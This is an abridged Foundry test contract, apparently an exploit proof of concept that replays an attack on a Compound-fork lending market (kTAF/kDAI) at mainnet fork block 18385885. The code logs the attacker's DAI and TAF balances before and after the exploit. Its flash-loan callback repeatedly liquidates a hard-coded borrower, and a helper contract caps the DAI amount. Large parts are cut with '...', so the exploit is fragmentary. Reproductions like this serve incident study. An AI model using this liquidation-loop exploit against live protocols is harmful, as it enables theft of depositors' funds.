...
contract ContractTest is Test {
    ...
    IERC20 private constant TAF =
        IERC20(0xf573E6740045b5387F6d36a26B102C2adF639af5);
    ICErc20Delegate private constant kTAF =
        ICErc20Delegate(payable(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5));
    ICErc20Immutable private constant kDAI =
        ICErc20Immutable(0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769);
    IComptroller private constant Unitroller =
        IComptroller(0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3);
    address private constant borrower =
        0x3cF7e9d9dCfeD77f295CF7A7F5539eC407D9a67d;

    function setUp() public {
        vm.createSelectFork("mainnet", 18385885);
    ...
    function testExploit() public {
        emit log_named_decimal_uint(
            "Attacker DAI balance before exploit",
            DAI.balanceOf(address(this)),
            DAI.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker TAF balance before exploit",
            TAF.balanceOf(address(this)),
            TAF.decimals()
        );
        ...
        emit log_named_decimal_uint(
            "Attacker TAF balance after exploit",
            TAF.balanceOf(address(this)),
            TAF.decimals()
        );
    }
    ...
    function receiveFlashLoan(
        ...
        while (true) {
            ...
            (, uint256 numCtokenCollateral) = Unitroller
            ...
            if (numCtokenCollateral <= kTAF.balanceOf(borrower)) {
                ...
                repayAmount =
                    ((kDAI.borrowBalanceStored(borrower) / 10) *
                        kTAF.balanceOf(borrower)) /
                    numCtokenCollateral;
                kDAI.liquidateBorrow(borrower, repayAmount, address(kTAF));
...
contract ExploitHelper {
    ...
    function start() external {
        ...
        if (amountDAI > 1_320 * 1e18) {
            amountDAI = 1_320 * 1e18;
        }
